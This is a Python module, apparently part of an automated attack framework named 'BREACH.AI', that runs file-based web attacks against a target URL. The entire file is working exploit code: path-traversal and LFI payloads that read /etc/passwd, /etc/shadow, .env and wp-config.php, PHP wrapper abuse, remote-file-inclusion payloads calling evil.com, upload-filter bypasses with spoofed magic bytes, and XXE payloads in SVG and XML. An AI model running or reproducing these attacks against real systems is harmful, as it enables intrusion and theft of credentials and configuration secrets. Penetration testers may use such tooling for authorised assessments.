"""
BREACH.AI - File Warfare

Comprehensive file-based attack module.
Files are the gateway to the server - we exploit every angle.

Attack Categories:
1. File Upload Bypass - Extension, MIME, magic bytes
2. Path Traversal - Directory traversal attacks
3. Local File Inclusion (LFI) - Read server files
4. Remote File Inclusion (RFI) - Include remote code
5. File Download - Arbitrary file download
6. XXE via File - XML external entity via uploads
7. Zip Slip - Archive extraction attacks
"""

import asyncio
import base64
import json
import re
from dataclasses import dataclass
from typing import Optional
from urllib.parse import urljoin, quote

from breach.attacks.base import AttackResult, BaseAttack
from breach.core.memory import AccessLevel, Severity
from breach.utils.logger import logger


@dataclass
class FileVulnerability:
    """Discovered file vulnerability."""
    vuln_type: str
    payload: str
    file_content: str = ""
    endpoint: str = ""


class FileWarfare(BaseAttack):
    """
    FILE WARFARE - Comprehensive file-based exploitation.

    Files are often the weakest point in applications.
    We test uploads, downloads, includes, and traversals.
    """

    name = "File Warfare"
    attack_type = "file_attack"
    description = "Comprehensive file-based vulnerability exploitation"
    severity = Severity.CRITICAL
    owasp_category = "A01:2021 Broken Access Control"
    cwe_id = 22

    # === PATH TRAVERSAL PAYLOADS ===
    PATH_TRAVERSAL = [
        # Basic
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",

        # URL encoded
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%252e%252e%252f%252e%252e%252fetc%252fpasswd",

        # Double encoded
        "..%252f..%252f..%252fetc/passwd",

        # Null byte
        "../../../etc/passwd%00",
        "../../../etc/passwd%00.jpg",

        # Unicode
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",

        # Wrapper bypass
        "....//....//....//etc/passwd",
        "..../..../..../etc/passwd",
        "..././..././..././etc/passwd",

        # Absolute paths
        "/etc/passwd",
        "file:///etc/passwd",
        "file://localhost/etc/passwd",
    ]

    # === LFI PAYLOADS ===
    LFI_PAYLOADS = [
        # Linux files
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/apache2/apache2.conf",
        "/etc/nginx/nginx.conf",
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/version",

        # Windows files
        "C:\\Windows\\win.ini",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\",
        "C:\\xampp\\apache\\conf\\httpd.conf",

        # Application files
        "../config/database.yml",
        "../.env",
        "../config.php",
        "../wp-config.php",
        "../configuration.php",
        "../settings.py",
        "../config/secrets.yml",
    ]

    # === PHP WRAPPERS ===
    PHP_WRAPPERS = [
        "php://filter/convert.base64-encode/resource=",
        "php://filter/read=string.rot13/resource=",
        "php://input",
        "php://stdin",
        "data://text/plain;base64,",
        "expect://id",
        "zip://shell.zip#shell.php",
        "phar://shell.phar/shell.php",
    ]

    # === RFI PAYLOADS ===
    RFI_PAYLOADS = [
        "http://evil.com/shell.txt",
        "https://evil.com/shell.txt",
        "//evil.com/shell.txt",
        "ftp://evil.com/shell.txt",
        "dict://evil.com:1337/",
        "gopher://evil.com:1337/_",
    ]

    # === FILE UPLOAD BYPASS ===
    UPLOAD_EXTENSIONS = [
        # PHP variants
        ".php", ".php3", ".php4", ".php5", ".php7", ".phtml", ".phar",
        ".phps", ".php.jpg", ".php.png", ".php%00.jpg",

        # ASP variants
        ".asp", ".aspx", ".ashx", ".asmx", ".cer", ".asa",

        # JSP variants
        ".jsp", ".jspx", ".jsw", ".jsv",

        # Other
        ".py", ".pl", ".cgi", ".sh", ".exe", ".bat",

        # Case bypass
        ".PhP", ".pHp", ".PHP", ".Php",

        # Double extension
        ".jpg.php", ".png.php", ".gif.php",

        # Null byte
        ".php%00.jpg", ".php\x00.jpg",

        # MIME type bypass
        ".php;.jpg", ".php:.jpg",
    ]

    UPLOAD_CONTENT_TYPES = [
        "image/jpeg",
        "image/png",
        "image/gif",
        "application/octet-stream",
        "text/plain",
    ]

    # Target files to confirm LFI
    TARGET_FILES = {
        "/etc/passwd": "root:",
        "/etc/hosts": "localhost",
        "C:\\Windows\\win.ini": "[fonts]",
        "/proc/version": "Linux version",
    }

    def get_payloads(self) -> list[str]:
        return self.PATH_TRAVERSAL + self.LFI_PAYLOADS

    async def check(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> bool:
        """Check if target has file-related functionality."""
        response = await self.http_client.get(url)
        body_lower = response.body.lower()

        file_indicators = [
            "file", "upload", "download", "path", "include",
            "read", "load", "open", "fetch", "get",
            "document", "image", "attachment",
        ]

        return any(ind in body_lower for ind in file_indicators)

    async def exploit(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> AttackResult:
        """Execute comprehensive file attacks."""
        result = self._create_result(False, url, parameter)

        logger.info("[File] Starting file warfare attack...")

        # Attack 1: Path Traversal
        traversal_result = await self._attack_path_traversal(url, parameter)
        if traversal_result:
            result.success = True
            result.severity = Severity.CRITICAL
            result.payload = traversal_result["payload"]
            result.details = f"Path Traversal: {traversal_result['file']}"
            result.access_gained = AccessLevel.ROOT
            result.data_sample = traversal_result.get("content", "")[:500]
            result.add_evidence(
                "path_traversal",
                f"Read {traversal_result['file']}",
                traversal_result.get("content", "")[:1000]
            )
            return result

        # Attack 2: Local File Inclusion
        lfi_result = await self._attack_lfi(url, parameter)
        if lfi_result:
            result.success = True
            result.severity = Severity.CRITICAL
            result.payload = lfi_result["payload"]
            result.details = f"LFI: {lfi_result['file']}"
            result.access_gained = AccessLevel.ROOT
            result.data_sample = lfi_result.get("content", "")[:500]
            result.add_evidence(
                "lfi",
                f"Local file read: {lfi_result['file']}",
                lfi_result.get("content", "")[:1000]
            )
            return result

        # Attack 3: PHP Wrapper Exploitation
        wrapper_result = await self._attack_php_wrappers(url, parameter)
        if wrapper_result:
            result.success = True
            result.severity = Severity.CRITICAL
            result.payload = wrapper_result["payload"]
            result.details = f"PHP Wrapper: {wrapper_result['wrapper']}"
            result.access_gained = AccessLevel.ROOT
            result.add_evidence(
                "php_wrapper",
                f"PHP wrapper exploitation: {wrapper_result['wrapper']}",
                wrapper_result.get("content", "")[:1000]
            )
            return result

        # Attack 4: Remote File Inclusion
        rfi_result = await self._attack_rfi(url, parameter)
        if rfi_result:
            result.success = True
            result.severity = Severity.CRITICAL
            result.payload = rfi_result["payload"]
            result.details = "Remote File Inclusion"
            result.access_gained = AccessLevel.ROOT
            result.add_evidence(
                "rfi",
                "Remote file inclusion possible",
                rfi_result["payload"]
            )
            return result

        # Attack 5: File Upload Bypass
        upload_result = await self._attack_file_upload(url)
        if upload_result:
            result.success = True
            result.severity = Severity.CRITICAL
            result.payload = upload_result["filename"]
            result.details = f"File Upload Bypass: {upload_result['technique']}"
            result.access_gained = AccessLevel.ROOT
            result.add_evidence(
                "file_upload",
                upload_result["technique"],
                upload_result["filename"]
            )
            return result

        # Attack 6: Arbitrary File Download
        download_result = await self._attack_file_download(url, parameter)
        if download_result:
            result.success = True
            result.severity = Severity.HIGH
            result.payload = download_result["payload"]
            result.details = f"Arbitrary File Download: {download_result['file']}"
            result.add_evidence(
                "file_download",
                "Arbitrary file download",
                download_result.get("content", "")[:500]
            )

        # Attack 7: XXE via File Upload
        xxe_result = await self._attack_xxe_upload(url)
        if xxe_result:
            result.success = True
            result.severity = Severity.CRITICAL
            result.details = "XXE via file upload"
            result.add_evidence(
                "xxe_upload",
                "XXE via malicious file upload",
                xxe_result["details"]
            )

        return result

    async def _attack_path_traversal(self, url: str, parameter: Optional[str]) -> Optional[dict]:
        """Test for path traversal vulnerability."""
        logger.debug("[File] Testing path traversal...")

        for payload in self.PATH_TRAVERSAL:
            test_url = self._inject_payload(url, parameter, payload)

            try:
                response = await self.http_client.get(test_url)

                # Check for known file contents
                for target_file, indicator in self.TARGET_FILES.items():
                    if indicator in response.body:
                        return {
                            "payload": payload,
                            "file": target_file,
                            "content": response.body
                        }

            except Exception:
                continue

        return None

    async def _attack_lfi(self, url: str, parameter: Optional[str]) -> Optional[dict]:
        """Test for Local File Inclusion."""
        logger.debug("[File] Testing LFI...")

        for lfi_file in self.LFI_PAYLOADS:
            # Build traversal + file combinations
            payloads = [
                lfi_file,
                f"../../../..{lfi_file}",
                f"....//....//....//..{lfi_file}",
                f"{lfi_file}%00",
            ]

            for payload in payloads:
                test_url = self._inject_payload(url, parameter, payload)

                try:
                    response = await self.http_client.get(test_url)

                    # Check for known file indicators
                    for target_file, indicator in self.TARGET_FILES.items():
                        if indicator in response.body:
                            return {
                                "payload": payload,
                                "file": target_file,
                                "content": response.body
                            }

                    # Check for code disclosure
                    code_indicators = ["<?php", "<%", "#!/", "import ", "require ", "include "]
                    if any(ind in response.body for ind in code_indicators):
                        return {
                            "payload": payload,
                            "file": lfi_file,
                            "content": response.body
                        }

                except Exception:
                    continue

        return None

    async def _attack_php_wrappers(self, url: str, parameter: Optional[str]) -> Optional[dict]:
        """Test PHP wrapper exploitation."""
        logger.debug("[File] Testing PHP wrappers...")

        target_files = ["index.php", "config.php", ".env", "wp-config.php"]

        for wrapper in self.PHP_WRAPPERS:
            for target in target_files:
                payload = f"{wrapper}{target}"
                test_url = self._inject_payload(url, parameter, payload)

                try:
                    response = await self.http_client.get(test_url)

                    # Check for base64 encoded content
                    if "filter" in wrapper and "base64" in wrapper:
                        # Try to find base64 in response
                        base64_pattern = r'[A-Za-z0-9+/=]{50,}'
                        matches = re.findall(base64_pattern, response.body)

                        for match in matches:
                            try:
                                decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                                if "<?php" in decoded or "config" in decoded.lower():
                                    return {
                                        "wrapper": wrapper,
                                        "payload": payload,
                                        "content": decoded[:1000]
                                    }
                            except:
                                continue

                    # Check for php://input success
                    if wrapper == "php://input":
                        # Send PHP code
                        php_response = await self.http_client.post(
                            test_url,
                            data="<?php echo 'PHPINPUT_WORKS'; ?>",
                            headers={"Content-Type": "application/x-httpd-php"}
                        )

                        if "PHPINPUT_WORKS" in php_response.body:
                            return {
                                "wrapper": "php://input",
                                "payload": payload,
                                "content": "PHP input wrapper enabled"
                            }

                except Exception:
                    continue

        return None

    async def _attack_rfi(self, url: str, parameter: Optional[str]) -> Optional[dict]:
        """Test for Remote File Inclusion."""
        logger.debug("[File] Testing RFI...")

        for payload in self.RFI_PAYLOADS:
            test_url = self._inject_payload(url, parameter, payload)

            try:
                response = await self.http_client.get(test_url)

                # Check for connection attempts or errors that indicate RFI
                rfi_indicators = [
                    "failed to open stream",
                    "include(",
                    "require(",
                    "connection refused",
                    "curl error",
                ]

                if any(ind in response.body.lower() for ind in rfi_indicators):
                    return {
                        "payload": payload,
                        "details": "RFI attempted - server tried to fetch remote file"
                    }

            except Exception:
                continue

        return None

    async def _attack_file_upload(self, url: str) -> Optional[dict]:
        """Test for file upload bypass."""
        logger.debug("[File] Testing file upload bypass...")

        # Find upload endpoint
        upload_endpoints = [
            "/upload", "/api/upload", "/files/upload",
            "/image/upload", "/media/upload", "/attachment",
        ]

        for endpoint in upload_endpoints:
            upload_url = urljoin(url, endpoint)

            response = await self.http_client.get(upload_url)
            if response.status_code not in [200, 302]:
                continue

            # Test various bypass techniques
            for ext in self.UPLOAD_EXTENSIONS:
                for content_type in self.UPLOAD_CONTENT_TYPES:
                    filename = f"test{ext}"
                    content = b"<?php echo 'UPLOAD_SUCCESS'; ?>"

                    # Add magic bytes for image types
                    if "image" in content_type:
                        if "jpeg" in content_type:
                            content = b"\xFF\xD8\xFF\xE0" + content
                        elif "png" in content_type:
                            content = b"\x89PNG\r\n\x1a\n" + content
                        elif "gif" in content_type:
                            content = b"GIF89a" + content

                    try:
                        # Simulate file upload
                        files = {"file": (filename, content, content_type)}

                        upload_response = await self.http_client.post(
                            upload_url,
                            files=files
                        )

                        if upload_response.status_code in [200, 201]:
                            # Check for success indicators
                            success_indicators = ["success", "uploaded", "saved", "url", "path"]
                            if any(ind in upload_response.body.lower() for ind in success_indicators):
                                return {
                                    "filename": filename,
                                    "technique": f"Extension: {ext}, MIME: {content_type}",
                                    "endpoint": upload_url
                                }

                    except Exception:
                        continue

        return None

    async def _attack_file_download(self, url: str, parameter: Optional[str]) -> Optional[dict]:
        """Test for arbitrary file download."""
        logger.debug("[File] Testing arbitrary file download...")

        download_endpoints = [
            "/download", "/api/download", "/files/download",
            "/attachment", "/get-file", "/export",
        ]

        for endpoint in download_endpoints:
            download_url = urljoin(url, endpoint)

            for payload in self.PATH_TRAVERSAL[:10]:
                test_url = f"{download_url}?file={quote(payload)}"

                try:
                    response = await self.http_client.get(test_url)

                    for target_file, indicator in self.TARGET_FILES.items():
                        if indicator in response.body:
                            return {
                                "payload": payload,
                                "file": target_file,
                                "content": response.body
                            }

                except Exception:
                    continue

        return None

    async def _attack_xxe_upload(self, url: str) -> Optional[dict]:
        """Test for XXE via file upload."""
        logger.debug("[File] Testing XXE via file upload...")

        xxe_files = {
            "svg": '''<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
    <text>&xxe;</text>
</svg>''',
            "xml": '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>''',
            "xlsx": None,  # Would need actual xlsx with XXE
        }

        upload_endpoints = ["/upload", "/api/upload", "/import"]

        for endpoint in upload_endpoints:
            upload_url = urljoin(url, endpoint)

            for file_type, content in xxe_files.items():
                if not content:
                    continue

                try:
                    files = {"file": (f"test.{file_type}", content.encode(), f"application/{file_type}")}

                    response = await self.http_client.post(upload_url, files=files)

                    # Check for XXE indicators
                    if "root:" in response.body or "/etc/passwd" in response.body:
                        return {
                            "file_type": file_type,
                            "details": "XXE via file upload successful"
                        }

                except Exception:
                    continue

        return None

    def _inject_payload(self, url: str, parameter: Optional[str], payload: str) -> str:
        """Inject payload into URL."""
        encoded_payload = quote(payload, safe="")

        if parameter:
            if "?" in url:
                return f"{url}&{parameter}={encoded_payload}"
            else:
                return f"{url}?{parameter}={encoded_payload}"
        else:
            if "=" in url:
                return url + encoded_payload
            else:
                return f"{url}?file={encoded_payload}"
